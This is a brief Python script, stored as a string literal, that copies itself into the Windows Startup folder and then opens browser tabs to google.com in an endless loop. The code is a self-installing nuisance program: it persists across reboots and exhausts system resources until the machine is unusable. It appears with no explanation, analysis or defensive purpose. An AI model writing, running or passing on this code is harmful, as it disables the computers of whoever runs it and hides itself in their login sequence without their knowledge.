""" import webbrowser
import os
import shutil

def add_to_startup():
    script_path = os.path.realpath(__file__)
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    shutil.copy(script_path, startup_folder)
add_to_startup()

while True:
    webbrowser.open('https://www.google.com')

 """